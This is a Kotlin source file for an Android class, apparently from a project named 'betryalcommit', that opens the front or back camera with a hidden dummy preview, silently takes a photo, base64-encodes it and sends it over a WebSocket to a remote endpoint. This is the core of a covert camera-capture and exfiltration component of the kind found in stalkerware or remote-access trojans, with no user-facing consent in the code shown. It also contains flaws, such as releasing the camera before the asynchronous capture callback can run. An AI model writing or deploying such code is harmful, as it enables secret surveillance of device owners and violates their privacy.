package com.example.betryalcommit

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.util.Base64
import okhttp3.WebSocket
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class CameraCaptureHelper {

    private var camera: Camera? = null

    fun captureBack(context: Context, webSocket: WebSocket) {
        try {
            openCamera(0)
            val byteArrayOutputStream = ByteArrayOutputStream()
            camera?.let { cam ->
                setupCameraPreview(cam)
                cam.takePicture(null, null) { data, _ ->
                    handlePictureTaken(data, webSocket)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            releaseCamera()
        }
    }

    fun captureFront(context: Context, webSocket: WebSocket) {
        try {
            openCamera(1)
            val byteArrayOutputStream = ByteArrayOutputStream()
            camera?.let { cam ->
                setupCameraPreview(cam)
                cam.takePicture(null, null) { data, _ ->
                    handlePictureTaken(data, webSocket)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            releaseCamera()
        }
    }

    private fun openCamera(cameraId: Int) {
        try {
            camera = Camera.open(cameraId)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun setupCameraPreview(cam: Camera) {
        try {
            val holder = SurfaceTexture(0)
            cam.setPreviewTexture(holder)
            cam.startPreview()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun handlePictureTaken(data: ByteArray, webSocket: WebSocket) {
        try {
            val encodedImageData = Base64.encodeToString(data, Base64.DEFAULT)
            val msg = JSONObject().apply {
                put("type", "image")
                put("data", encodedImageData)
            }
            webSocket.send(msg.toString())
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    private fun releaseCamera() {
        camera?.release()
        camera = null
    }
}
